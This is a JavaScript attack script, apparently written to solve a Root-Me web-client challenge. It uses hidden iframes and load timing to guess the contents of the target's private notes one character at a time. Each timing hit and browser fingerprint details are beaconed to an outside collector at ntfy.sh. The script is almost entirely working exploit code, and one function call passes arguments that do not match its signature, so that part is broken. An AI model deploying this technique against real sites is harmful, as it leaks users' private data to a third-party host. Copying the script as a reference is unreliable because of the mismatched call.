const B='https://web-client-ch56.challenge01.root-me.org:58056/';
const N='https://ntfy.sh/wcxleak56a';
const RID=Date.now()%100000;
const T0=Date.now(),EL=()=>Date.now()-T0;
const beacon=s=>{try{navigator.sendBeacon(N,s)}catch(e){}};
const logj=o=>beacon(JSON.stringify(Object.assign({r:RID,t:Math.round(EL()*10)/10},o)));
const CHARS='abcdefghijklmnopqrstuvwxyz0123456789-_ ';
let seq=0,dead=0;
addEventListener('pagehide',()=>logj({ev:'ph'}));
addEventListener('visibilitychange',()=>logj({ev:'vis',st:document.visibilityState}));
setInterval(()=>{if(!dead)logj({ev:'hb'})},2000);setTimeout(()=>dead=1,24000);
function probe(id,q){return new Promise(res=>{const f=document.createElement('iframe');const st=Date.now();let fin=0;
 const done=v=>{if(!fin){fin=1;try{f.remove()}catch(e){}res(v)}};
 f.style.cssText='display:none;width:0;height:0';
 f.onload=()=>{const d=Date.now()-st;if(d>1500&&d<6000)logj({ev:'h',i:id,c:q,d:d});done(d)};
 f.onerror=()=>done(9999);
 setTimeout(()=>done(9998),3500);
 const myseq=seq++;
 setTimeout(()=>{if(!fin)document.body.appendChild(f)},14*(myseq%34));
 f.src=B+'notes/'+id+'/'+encodeURIComponent(q)+'?v='+RID+'x'+(myseq);});}
async function wave(halves,tick){
 const jobs=[];let n=0;
 halves.forEach(h=>{if(!h)return;const[id,cs]=h;
  cs.forEach(c=>{n++;jobs.push(probe(id,c))});});
 // progress ticks: log at ~1/3 settled and at completion
 let doneN=0;const t0=Date.now();
 jobs.forEach(j=>j.then(()=>{doneN++;
  const el=Date.now()-t0;
  if((doneN===n)||(el>1300&&!tick.t1)){tick.t1=1;logj({ev:'tk',w:tick.w,dn:doneN,n:n})}
 }));
 await Promise.all(jobs);
 return doneN;}
(async()=>{
 const H=new Map(location.hash.slice(1).split('&').map(s=>[s.split('=')[0]||'',s.split('=')[1]||'']));
 let ids=(H.get('k')||'1,2,3,4,5,6,7,8').split(',').map(x=>parseInt(x)).filter(x=>x>0);
 const conn=navigator.connection||{};
 logj({ev:'start',ua:navigator.userAgent.slice(0,55),ck:navigator.cookieEnabled?1:0,hc:navigator.hardwareConcurrency,et:conn.effectiveType||'-',rt:conn.rtt!=-1?conn.rtt:-1,ids:ids.join(',')});
 const m0=Date.now();
 await new Promise(res=>{const f=document.createElement('iframe');f.style.cssText='display:none';
  f.onload=()=>{logj({ev:'mk',t:Date.now()-m0});res()};f.onerror=()=>{logj({ev:'mk',err:1});res()};setTimeout(res,4500);f.src=B+'?m='+RID;document.body.appendChild(f);});
 const pairs=[];
 for(let i=0;i<ids.length;i+=2)pairs.push(ids.slice(i,i+2));
 for(let w=0;w<pairs.length;w++){
  if(EL()>21000){logj({ev:'cut',w:w});break;}
  const[a,b]=pairs[w];const L=CHARS.slice(0,19),R=CHARS.slice(19);
  const tick={w:w};
  await wave(a?[a,L.split('')]:null,b?[b,L.split('')]:null,tick);
  if(EL()>21000){logj({ev:'cut2',w:w});break;}
  await wave(a?[a,R.split('')]:null,b?[b,R.split('')]:null,{w:w});
  logj({ev:'pairdone',w:w,a:a,b:b});
 }
 logj({ev:'done'});
})();
